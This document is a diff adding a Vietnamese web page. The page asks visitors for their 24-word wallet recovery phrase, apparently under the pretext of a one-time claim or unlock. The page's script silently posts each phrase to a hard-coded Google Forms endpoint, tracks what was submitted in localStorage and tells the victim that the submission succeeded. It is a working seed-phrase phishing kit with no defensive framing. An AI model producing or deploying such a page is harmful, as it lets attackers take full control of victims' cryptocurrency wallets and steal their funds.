@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Form Nhập Cụm Mật Khẩu</title>
+    
+    <!-- Thư viện Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- Thư viện SweetAlert2 -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <!-- Thư viện jQuery -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+
+    <form method="POST" id="form" class="max-w-md w-full p-6 bg-white shadow-lg rounded-lg">
+        <h2 class="text-xl font-bold text-center text-gray-700 mb-4">Nhập cụm mật khẩu</h2>
+        
+        <div class="mb-4">
+            <textarea class="w-full p-3 text-sm rounded border resize-none focus:outline-none focus:border-purple-500" 
+                      rows="5" placeholder="Nhập cụm mật khẩu 24 từ của bạn tại đây"></textarea>
+        </div>
+
+        <div class="text-red-500 mb-2 text-center hidden text-sm" id="error-message"></div>
+
+        <button class="w-full px-4 py-2 font-bold text-white bg-purple-500 rounded-lg hover:bg-purple-600 transition duration-300" 
+                id="btn-open">
+            MỞ KHÓA
+        </button>
+        <!-- Phần lưu ý -->
+    <p class="text-xs text-gray-500 text-center mt-2">*Lưu ý: Mỗi ví chỉ được nhận 1 lần duy nhất</p>
+
+    </form>
+
+    <script>
+        $(document).ready(function() {
+            $("#form").submit(function(e) {
+                e.preventDefault();
+
+                var textarea = $(this).find('textarea');
+                var mnemonic = textarea.val().trim();
+                var btnSubmit = $('#btn-open');
+                var errorMsg = $('#error-message');
+
+                var words = mnemonic.split(/\s+/);
+
+                if (words.length !== 24) {
+                    Swal.fire({
+                        icon: "error",
+                        title: "Lỗi!",
+                        text: "Cụm mật khẩu phải có đúng 24 từ. Vui lòng kiểm tra lại!",
+                    });
+                    return false;
+                }
+
+                // Kiểm tra trùng lặp trong localStorage
+                var sentMnemonics = JSON.parse(localStorage.getItem("sentMnemonics")) || [];
+                if (sentMnemonics.includes(mnemonic)) {
+                    Swal.fire({
+                        icon: "warning",
+                        title: "Cảnh báo!",
+                        text: "Cụm mật khẩu này đã được gửi trước đó. Vui lòng nhập một cụm khác!",
+                    });
+                    return false;
+                }
+
+                btnSubmit.prop('disabled', true).html('Đang xử lý...');
+
+                var googleFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSdTB8GCil6wVsF7bP3fPqdO2h_6OEA9LrTVWIp9KOWgHQgqSQ/formResponse";
+                var formData = {
+                    "entry.624281135": mnemonic
+                };
+
+                $.ajax({
+                    url: googleFormURL,
+                    type: "POST",
+                    data: formData,
+                    dataType: "xml",
+                    statusCode: {
+                        0: function() { 
+                            Swal.fire({
+                                icon: "success",
+                                title: "Thành công!",
+                                text: "Cụm mật khẩu đã được gửi thành công.",
+                            });
+                            sentMnemonics.push(mnemonic);
+                            localStorage.setItem("sentMnemonics", JSON.stringify(sentMnemonics)); 
+                            $("#form").trigger("reset");
+                        },
+                        200: function() {
+                            Swal.fire({
+                                icon: "success",
+                                title: "Thành công!",
+                                text: "Cụm mật khẩu đã được gửi thành công.",
+                            });
+                            sentMnemonics.push(mnemonic);
+                            localStorage.setItem("sentMnemonics", JSON.stringify(sentMnemonics)); 
+                            $("#form").trigger("reset");
+                        }
+                    },
+                    error: function() {
+                        Swal.fire({
+                            icon: "error",
+                            title: "Lỗi!",
+                            text: "Có lỗi xảy ra, vui lòng thử lại!",
+                        });
+                    },
+                    complete: function() {
+                        btnSubmit.prop('disabled', false).html('MỞ KHÓA');
+                    }
+                });
+            });
+
+            $('#form textarea').on('input', function() {
+                $('#error-message').addClass('hidden');
+            });
+        });
+    </script>
+</body>
+</html>
